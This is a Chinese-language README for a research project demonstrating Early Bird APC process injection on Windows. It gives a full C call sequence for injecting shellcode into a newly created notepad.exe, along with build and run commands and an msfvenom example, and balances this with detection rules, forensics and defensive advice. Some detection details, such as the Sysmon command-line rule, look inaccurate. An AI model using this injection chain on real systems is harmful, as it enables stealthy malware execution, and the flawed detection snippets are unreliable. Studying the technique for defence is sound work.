# Early Bird APC Injection - 早鸟 APC 注入技术

## 📋 技术概述

**Early Bird APC Injection** 是一种高级进程注入技术，利用 Windows 的 **APC (Asynchronous Procedure Call，异步过程调用)** 机制，在目标进程主线程启动的早期阶段注入恶意代码。

### 核心思想
1. **调试模式创建进程**：使用 `DEBUG_PROCESS` 标志创建挂起的目标进程
2. **早期注入时机**：在进程主线程真正开始运行前注入 APC
3. **自然执行流**：利用 APC 机制，代码在线程正常初始化时自动执行
4. **无需劫持**：不需要劫持现有线程或修改进程代码

**命名由来**："Early Bird" = 早起的鸟儿，寓意在进程启动的最早阶段就完成注入。

---

## 🔬 技术原理

### 1. APC 机制详解

APC (Asynchronous Procedure Call) 是 Windows 的异步执行机制：

```
线程状态        APC 队列
    |              |
    v              |
[运行中]           [APC 1]
    |              [APC 2]
    v              [APC 3]
[进入等待] ------> |
    |              v
    v          [执行 APC 1]
[可警报状态] <---> [执行 APC 2]
    |              [执行 APC 3]
    v              |
[继续运行] <-------+
```

**关键概念**：
- 每个线程都有一个 **APC 队列**
- 线程进入 **可警报状态** (alertable state) 时，APC 队列中的函数被执行
- 可警报状态触发时机：
  - 调用 `SleepEx(timeout, TRUE)`
  - 调用 `WaitForSingleObjectEx(..., TRUE)`
  - 线程初始化时（Early Bird 利用的关键！）

### 2. Early Bird 的时序优势

```
传统 APC 注入                   Early Bird APC 注入
    |                               |
[进程已运行]                   [CreateProcessA]
    |                          (DEBUG_PROCESS 标志)
    |                               |
[寻找可警报线程]               [进程挂起状态]
    |                               |
[QueueUserAPC]                 [VirtualAllocEx]
    |                          [WriteProcessMemory]
    v                          [VirtualProtectEx]
[等待线程警报]                     |
    |                          [QueueUserAPC]
    v                          (主线程 APC 队列)
[代码执行]                         |
                               [DebugActiveProcessStop]
                                   |
                               [主线程自动启动]
                                   |
                               [初始化时警报]
                                   v
                               [APC 立即执行]
```

**时间窗口对比**：
- **传统 APC**：注入已运行的进程，需要找到或等待可警报线程
- **Early Bird**：在进程启动前注入，主线程初始化时自动执行

### 3. 完整技术流程

```c
// 步骤 1：以调试模式创建目标进程
PROCESS_INFORMATION pi = {0};
CreateProcessA(
    NULL,
    "C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, FALSE,
    DEBUG_PROCESS,  // 关键：进程挂起
    NULL, NULL, &si, &pi
);
// 此时进程已创建，但主线程尚未开始执行

// 步骤 2：在目标进程分配内存
PVOID remoteAddr = VirtualAllocEx(
    pi.hProcess,
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);

// 步骤 3：写入 shellcode
WriteProcessMemory(
    pi.hProcess,
    remoteAddr,
    shellcode,
    shellcodeSize,
    &bytesWritten
);

// 步骤 4：修改为可执行权限
VirtualProtectEx(
    pi.hProcess,
    remoteAddr,
    shellcodeSize,
    PAGE_EXECUTE_READ,
    &oldProtect
);

// 步骤 5：将 shellcode 地址加入主线程 APC 队列（关键！）
QueueUserAPC(
    (PAPCFUNC)remoteAddr,  // shellcode 地址
    pi.hThread,            // 主线程句柄
    0                      // 参数（可选）
);
// APC 已排队，但尚未执行

// 步骤 6：停止调试，让进程继续运行
DebugActiveProcessStop(pi.dwProcessId);

// 步骤 7：主线程开始运行，初始化时自动进入可警报状态
// → APC 队列中的 shellcode 被执行！
```

---

## 🆚 与其他技术的对比

### Early Bird APC vs 传统 APC 注入

| 特性 | 传统 APC 注入 | Early Bird APC |
|-----|------------|----------------|
| **注入时机** | 进程运行时 | 进程启动前 |
| **目标线程** | 需寻找可警报线程 | 直接使用主线程 |
| **执行时机** | 等待线程进入警报状态 | 主线程初始化时立即执行 |
| **检测难度** | 中（运行时行为可见） | 高（启动阶段就完成） |
| **成功率** | 依赖目标线程行为 | 非常高（主线程必然初始化） |

### Early Bird APC vs Process Hollowing

| 特性 | Process Hollowing | Early Bird APC |
|-----|------------------|----------------|
| **技术复杂度** | 高（需卸载镜像、重映射） | 低（仅需 APC 队列） |
| **内存操作** | NtUnmapViewOfSection + 重映射 | VirtualAllocEx + WriteProcessMemory |
| **进程状态** | CREATE_SUSPENDED | DEBUG_PROCESS |
| **检测特征** | NtUnmapViewOfSection 调用 | QueueUserAPC 调用 |
| **适用载荷** | PE 文件 | Shellcode |

### Early Bird APC vs DLL Injection

| 特性 | DLL Injection | Early Bird APC |
|-----|--------------|----------------|
| **载荷类型** | DLL 文件 | Shellcode（内存） |
| **文件落地** | 是（DLL 文件） | 否（纯内存） |
| **加载机制** | LoadLibrary | 直接执行 |
| **检测方法** | 枚举已加载模块 | 内存扫描 |
| **隐蔽性** | 中 | 高 |

---

## 🛠️ 实现步骤

### 核心函数调用链

```
main()
  └─> ReadShellcodeFile()           // 读取 shellcode 文件
  └─> CreateDebuggedProcess()       // 创建调试进程
        └─> CreateProcessA()        // DEBUG_PROCESS 标志 ★
  └─> InjectShellcode()             // 注入 shellcode
        ├─> VirtualAllocEx()        // 分配内存
        ├─> WriteProcessMemory()    // 写入 shellcode
        └─> VirtualProtectEx()      // 修改为可执行
  └─> QueueAPCToThread()            // 队列 APC ★
        └─> QueueUserAPC()          // 加入 APC 队列
  └─> DebugActiveProcessStop()      // 停止调试，进程继续运行 ★
```

### 关键 API 说明

#### 1. CreateProcessA - 创建调试进程
```c
BOOL success = CreateProcessA(
    NULL,                       // 应用程序名
    "C:\\Windows\\System32\\notepad.exe",  // 命令行
    NULL,                       // 进程安全属性
    NULL,                       // 线程安全属性
    FALSE,                      // 不继承句柄
    DEBUG_PROCESS |             // 调试模式（进程挂起）★
    DEBUG_ONLY_THIS_PROCESS,    // 仅调试此进程
    NULL,                       // 环境变量
    NULL,                       // 当前目录
    &si,                        // 启动信息
    &pi                         // 进程信息（返回）
);
```

**关键点**：
- `DEBUG_PROCESS` 标志使进程以挂起状态创建
- 主线程已创建但尚未开始执行
- 为注入 APC 提供时间窗口

#### 2. QueueUserAPC - 队列 APC
```c
BOOL success = QueueUserAPC(
    (PAPCFUNC)shellcodeAddr,    // APC 函数地址（shellcode）★
    hThread,                    // 目标线程句柄
    0                           // 传递给 APC 函数的参数
);
```

**关键点**：
- `PAPCFUNC` 类型：`VOID CALLBACK ApcProc(ULONG_PTR dwParam)`
- Shellcode 必须遵循此调用约定
- APC 队列是 FIFO（先进先出）

#### 3. DebugActiveProcessStop - 停止调试
```c
BOOL success = DebugActiveProcessStop(
    dwProcessId                 // 目标进程 PID
);
```

**关键点**：
- 停止调试后，进程从挂起状态恢复
- 主线程开始正常初始化
- 初始化过程中进入可警报状态，触发 APC 执行

---

## 🔍 检测方法

### 1. 行为特征检测

Early Bird APC 注入具有以下可疑行为序列：

```python
suspicious_sequence = [
    "CreateProcessA(..., DEBUG_PROCESS)",  # 以调试模式创建进程
    "VirtualAllocEx(...)",                 # 在远程进程分配内存
    "WriteProcessMemory(...)",             # 写入数据到远程进程
    "QueueUserAPC(..., main_thread, ...)", # 队列 APC 到主线程
    "DebugActiveProcessStop(...)"          # 停止调试，进程继续运行
]
```

### 2. EDR 检测规则

| 检测点 | 描述 | 风险等级 |
|-------|------|---------|
| **DEBUG_PROCESS 创建** | 进程以调试模式创建 | 中 |
| **跨进程内存写入** | VirtualAllocEx + WriteProcessMemory | 高 |
| **APC 队列到新进程** | 向刚创建进程的主线程队列 APC | 高 |
| **调试器分离** | DebugActiveProcessStop 后进程继续运行 | 中 |
| **组合行为** | 上述4个行为在短时间内连续发生 | **非常高** |

### 3. 内核驱动检测

```c
// 在进程创建回调中检测
VOID ProcessNotifyCallback(
    HANDLE ParentId,
    HANDLE ProcessId,
    BOOLEAN Create
) {
    if (Create) {
        // 检查进程是否以调试模式创建
        if (PsIsProcessBeingDebugged(ProcessId)) {
            // 监控后续的 APC 队列操作
            MonitorAPCQueue(ProcessId);
        }
    }
}

// 在 APC 队列回调中检测
VOID APCQueueCallback(
    HANDLE ThreadId,
    PVOID ApcRoutine,
    PVOID ApcContext
) {
    // 检查 APC 函数地址是否在合法模块范围内
    if (!IsAddressInModule(ApcRoutine)) {
        // 可疑：APC 函数地址在匿名内存中
        AlertSecurity("Early Bird APC injection detected!");
    }
}
```

### 4. Sysmon 检测配置

```xml
<RuleGroup groupRelation="or">
  <!-- 检测以调试模式创建进程 -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">DEBUG_PROCESS</CommandLine>
  </ProcessCreate>

  <!-- 检测跨进程内存操作 -->
  <ProcessAccess onmatch="include">
    <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
    <CallTrace condition="contains">QueueUserAPC</CallTrace>
  </ProcessAccess>
</RuleGroup>
```

### 5. 内存取证

```bash
# Volatility 检测 Early Bird APC
volatility -f memory.dmp --profile=Win10x64 pslist
# 查找以调试模式启动的进程

volatility -f memory.dmp --profile=Win10x64 threads -p <PID>
# 检查主线程的 APC 队列

volatility -f memory.dmp --profile=Win10x64 malfind
# 扫描可疑的可执行内存区域
```

---

## 📦 编译和运行

### Windows (MSYS2/MinGW)

```bash
# 运行构建脚本
./build.bat

# 或手动编译
mkdir -p build/x64

# 1. 编译 shellcode 生成器
gcc -o build/x64/generate_shellcode.exe src/generate_shellcode.c -O2 -s

# 2. 生成 shellcode
build/x64/generate_shellcode.exe build/x64/payload.bin

# 3. 编译主程序
gcc -o build/x64/early_bird_apc.exe src/early_bird_apc.c -lpsapi -O2 -s

# 4. 编译测试载荷（可选）
gcc -o build/x64/test_payload.exe src/test_payload.c -luser32 -mwindows -O2 -s
```

### Linux (交叉编译)

```bash
# 运行构建脚本
./build.sh

# 或使用 CMake
mkdir build && cd build
cmake ..
make
```

### 运行示例

```bash
# 管理员权限运行（注入到 notepad.exe）
build/x64/early_bird_apc.exe C:\Windows\System32\notepad.exe build/x64/payload.bin

# 注入到 calc.exe
build/x64/early_bird_apc.exe C:\Windows\System32\calc.exe build/x64/payload.bin

# 使用自定义 shellcode
# 1. 生成自定义 shellcode（例如使用 msfvenom）
msfvenom -p windows/x64/messagebox TEXT="Pwned!" -f raw -o custom.bin

# 2. 注入自定义 shellcode
build/x64/early_bird_apc.exe C:\Windows\System32\cmd.exe custom.bin
```

**预期输出**：
```
======================================
  Early Bird APC Injection 技术
======================================

[1] 读取 shellcode 文件
    文件：build/x64/payload.bin
    大小：317 字节
    ✓ Shellcode 读取成功

[2] 以调试模式创建目标进程
    目标：C:\Windows\System32\notepad.exe
    进程 PID：1234
    线程 TID：5678
    ✓ 进程已创建（挂起状态）

[3] 注入 shellcode 到远程进程
    注入地址：0x00000000ABCD0000
    ✓ Shellcode 注入成功

[4] 将 shellcode 地址加入主线程 APC 队列
    ✓ APC 已排队到线程 5678

[5] 停止调试，恢复进程执行
    ✓ 进程已恢复运行
    ✓ 主线程启动时将自动执行 APC 队列中的 shellcode

======================================
✓ Early Bird APC 注入完成
进程 PID：1234
线程 TID：5678
======================================
```

此时，notepad.exe 进程启动，同时弹出消息框显示 "Early Bird APC Injection 成功！"

---

## 📂 目录结构

```
06-early-bird-apc/
├── README.md                      # 本文档
├── build.sh                       # Linux 构建脚本
├── build.bat                      # Windows 构建脚本
├── CMakeLists.txt                 # CMake 配置
├── src/
│   ├── early_bird_apc.c           # 主程序实现 (~300 行)
│   ├── generate_shellcode.c       # Shellcode 生成器
│   └── test_payload.c             # 测试载荷程序
└── build/
    └── x64/
        ├── early_bird_apc.exe
        ├── generate_shellcode.exe
        ├── payload.bin
        └── test_payload.exe
```

---

## 🎯 技术要点

### 1. DEBUG_PROCESS 的作用

```c
CreateProcessA(..., DEBUG_PROCESS, ...);
```

**效果**：
- 进程以挂起状态创建
- 主线程已创建但尚未执行任何代码
- 调试器接收到 `CREATE_PROCESS_DEBUG_EVENT`
- 必须调用 `ContinueDebugEvent` 或 `DebugActiveProcessStop` 才能继续

**为什么不用 CREATE_SUSPENDED**：
- `CREATE_SUSPENDED` 需要调用 `ResumeThread` 恢复
- `DEBUG_PROCESS` 提供更好的控制，且不触发 `CREATE_SUSPENDED` 特征

### 2. APC 执行时机

主线程何时执行 APC？

```c
// ntdll!RtlUserThreadStart 的简化流程
VOID RtlUserThreadStart(PVOID StartAddress, PVOID Parameter) {
    // 1. 初始化线程环境块（TEB）
    InitializeTEB();

    // 2. 初始化异常处理
    InitializeExceptionHandling();

    // 3. 进入可警报状态，执行 APC 队列
    // → Early Bird 注入的 shellcode 在此执行！
    ExecuteUserAPCs();

    // 4. 调用真正的入口点
    StartAddress(Parameter);
}
```

**关键时刻**：`ExecuteUserAPCs()` 在入口点之前调用！

### 3. Shellcode 要求

Early Bird APC 注入的 shellcode 必须：

1. **位置无关** (Position Independent Code, PIC)
   - 不依赖硬编码地址
   - 动态获取 API 地址（PEB 遍历）

2. **符合 APC 调用约定**
   ```c
   typedef VOID (NTAPI *PAPCFUNC)(ULONG_PTR Parameter);
   ```

3. **自包含**
   - 不依赖外部库（或自行加载）
   - 包含所有需要的代码和数据

4. **正确清理**
   - 恢复寄存器状态
   - 正确返回（或调用 ExitThread）

### 4. 权限要求

Early Bird APC 需要以下权限：

| 操作 | 所需权限 |
|-----|---------|
| CreateProcessA | `PROCESS_ALL_ACCESS`（自动获得） |
| VirtualAllocEx | `PROCESS_VM_OPERATION` |
| WriteProcessMemory | `PROCESS_VM_WRITE` |
| QueueUserAPC | `THREAD_SET_CONTEXT` |

**注意**：如果目标是受保护进程（如 PPL），即使管理员也无法注入。

---

## 🛡️ 防御建议

### 对于安全产品

1. **监控进程创建标志**
   - 检测 `DEBUG_PROCESS` 和 `DEBUG_ONLY_THIS_PROCESS` 组合
   - 记录调试器分离事件（`DebugActiveProcessStop`）

2. **APC 队列监控**
   - Hook `KeInitializeApc` 和 `KeInsertQueueApc`
   - 验证 APC 函数地址是否在合法模块范围内
   - 检测向新创建进程的主线程队列 APC

3. **内存扫描**
   - 扫描新创建进程的可执行内存区域
   - 检测非模块映射的可执行页面
   - YARA 规则扫描 shellcode 特征

4. **行为分析**
   - 建立行为基线模型
   - 检测短时间内的可疑 API 调用序列
   - 关联进程创建和内存注入事件

### 对于系统管理员

1. **启用高级审计**
   ```powershell
   # 启用进程创建审计
   auditpol /set /subcategory:"Process Creation" /success:enable

   # 启用线程操作审计
   auditpol /set /subcategory:"Thread Manipulation" /success:enable
   ```

2. **部署 Sysmon**
   - 配置规则监控 `DEBUG_PROCESS` 创建
   - 记录跨进程内存操作
   - 监控 APC 队列操作

3. **应用白名单**
   - 限制哪些进程可以调试其他进程
   - 禁止非授权程序创建调试进程

4. **最小权限原则**
   - 限制用户的 `SeDebugPrivilege`
   - 使用受保护进程（PPL）保护关键进程

---

## 📚 参考资料

1. **原始研究**
   - [CyberArk: Process Injection: Early Bird APC](https://www.cyberark.com/resources/threat-research-blog/early-bird-catches-the-worm)
   - [Elastic: Process Injection Techniques](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

2. **MITRE ATT&CK**
   - [T1055.004: Asynchronous Procedure Call](https://attack.mitre.org/techniques/T1055/004/)

3. **Microsoft 官方文档**
   - [QueueUserAPC function](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
   - [CreateProcessA function](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
   - [DebugActiveProcessStop function](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop)

4. **相关技术研究**
   - Process Hollowing
   - Thread Execution Hijacking
   - AtomBombing

5. **GitHub 参考实现**
   - [AbdouRoumi/Early_Bird_APC_Injection](https://github.com/AbdouRoumi/Early_Bird_APC_Injection)

---

## ⚖️ 免责声明

本项目仅用于**安全研究和教育目的**。Early Bird APC Injection 是一项合法的 Windows 进程注入技术，但可能被恶意软件用于规避检测。

- ✅ **合法用途**：安全研究、EDR 测试、红队演练
- ❌ **禁止用途**：未授权的系统访问、恶意软件开发

使用者需遵守当地法律法规，仅在授权环境中使用本技术。

---

## 📝 实现说明

- **语言**：纯 C 实现（C11 标准）
- **编译器**：GCC (MinGW-w64) / MSVC
- **测试环境**：Windows 10 21H2 (x64)
- **代码风格**：详细中文注释，易于理解
- **依赖库**：psapi.lib

---

**作者**：基于 AbdouRoumi 和 CyberArk 的研究实现
**日期**：2025年
**版本**：1.0
